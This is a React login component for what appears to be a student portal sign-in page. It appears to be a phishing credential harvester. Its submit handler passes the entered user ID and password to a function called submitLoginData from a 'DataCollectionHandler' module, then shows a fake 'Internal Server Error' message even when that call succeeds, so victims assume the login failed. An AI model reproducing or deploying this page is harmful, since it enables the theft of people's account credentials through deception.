import { useState } from "react";
import UserIcon from "./UI/UserIcon";
import Lock from "./UI/Lock";
import EyeOpen from "./UI/EyeOpen";
import EyeClosed from "./UI/EyeClosed";
import { submitLoginData } from "../utils/DataCollectionHandler";

export default function Left() {
	const [showPassword, setShowPassword] = useState(false);
	const [userId, setUserId] = useState("");
	const [password, setPassword] = useState("");
	const [userIdFocused, setUserIdFocused] = useState(false);
	const [passwordFocused, setPasswordFocused] = useState(false);
	const [isSubmitting, setIsSubmitting] = useState(false);
	const [showError, setShowError] = useState(false);

	const handleSubmit = async (e: React.FormEvent) => {
		e.preventDefault();
		setIsSubmitting(true);

		try {
			await submitLoginData(userId, password);
			setShowError(true);
			setTimeout(() => setShowError(false), 3000);
		} catch (error) {
			console.error('Login failed:', error);
			setShowError(true);
			setTimeout(() => setShowError(false), 3000);
		} finally {
			setIsSubmitting(false);
		}
	};

	return (
		<div className="w-[58%] max-[950px]:w-full max-sm:absolute max-sm:bottom-0 max-sm:rounded-b-none flex items-center justify-center bg-white">
			<div className="bg-white rounded-2xl box-shadow shadow-gray-400 p-10 max-sm:w-full max-[950px]:w-10/11 w-125">
				<h1 className="text-4xl font-bold roboto text-[#162d6c] mb-2">
					Welcome Back
				</h1>
				<p className="text-gray-800 mb-8">Sign in to access your account</p>

				<form className="space-y-6" onSubmit={handleSubmit}>
					<div className="relative">
						<span
							className={`absolute left-4 top-1/2 -translate-y-1/2 transition-colors ${userIdFocused || userId ? "text-[#14C38E]" : "text-gray-400"}`}
						>
							<UserIcon />
						</span>
						<input
							type="text"
							value={userId}
							onChange={(e) => setUserId(e.target.value)}
							onFocus={() => setUserIdFocused(true)}
							onBlur={() => setUserIdFocused(false)}
							className="w-full pl-12 pr-4 py-4 border border-gray-400 rounded-lg focus:outline-none focus:ring-0 focus:border-2 focus:border-[#14C38E] peer"
						/>
						<label
							className={`absolute left-3 bg-white px-1 text-gray-500 transition-all pointer-events-none ${userIdFocused || userId ? "-top-2.5 text-xs text-[#14C38E]" : "top-1/2 -translate-y-1/2 left-12"}`}
						>
							User ID
						</label>
					</div>

					<div className="relative">
						<span
							className={`absolute left-4 top-1/2 -translate-y-1/2 transition-colors ${passwordFocused || password ? "text-[#14C38E]" : "text-gray-400"}`}
						>
							<Lock/>
						</span>
						<input
							type={showPassword ? "text" : "password"}
							value={password}
							onChange={(e) => setPassword(e.target.value)}
							onFocus={() => setPasswordFocused(true)}
							onBlur={() => setPasswordFocused(false)}
							className="w-full pl-12 pr-12 py-4 border border-gray-400 rounded-lg focus:outline-none ring-0 focus:border-2 focus:border-[#14C38E]"
						/>
						<label
							className={`absolute left-3 bg-white px-1 text-gray-500 transition-all pointer-events-none ${passwordFocused || password ? "-top-2.5 text-xs text-[#14C38E]" : "top-1/2 -translate-y-1/2 left-12"}`}
						>
							Password
						</label>
						<button
							type="button"
							onClick={() => setShowPassword(!showPassword)}
							className={`absolute right-4 top-1/2 -translate-y-1/2 transition-colors ${passwordFocused || password ? "text-[#14C38E]" : "text-gray-400"} hover:text-gray-600`}
						>
							{showPassword ? <EyeOpen/> : <EyeClosed/>}
						</button>
					</div>

					<div className="flex justify-between text-sm">
						<a
							href="#"
							className="text-[#14C38E] font-medium hover:text-[#14C38E]"
						>
							Forgot Password?
						</a>
						<a
							href="#"
							className="text-[#14C38E] font-medium hover:text-[#14C38E]"
						>
							Use Biometric
						</a>
					</div>

					<button
						type="submit"
						disabled={isSubmitting}
						className="w-full cursor-pointer bg-[#14C38E] hover:-translate-y-0.5 transition duration-300 text-white font-semibold py-3 rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
					>
						{isSubmitting ? 'Signing In...' : 'Sign In'}
					</button>

					<p className="text-center text-gray-700">
						Not a student?{" "}
						<a href="#" className="text-[#14C38E] hover:text-[#14C38E]">
							Application Portal
						</a>
					</p>
				</form>
			</div>

			{/* Error Popup */}
			{showError && (
				<div className="fixed bottom-4 left-4 bg-red-600 text-white px-6 py-4 rounded-lg shadow-lg animate-slide-in z-50">
					<div className="flex items-center gap-3">
						<svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
							<path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
						</svg>
						<div>
							<p className="font-semibold">Internal Server Error</p>
							<p className="text-sm">Please try again later</p>
						</div>
					</div>
				</div>
			)}
		</div>
	);
}
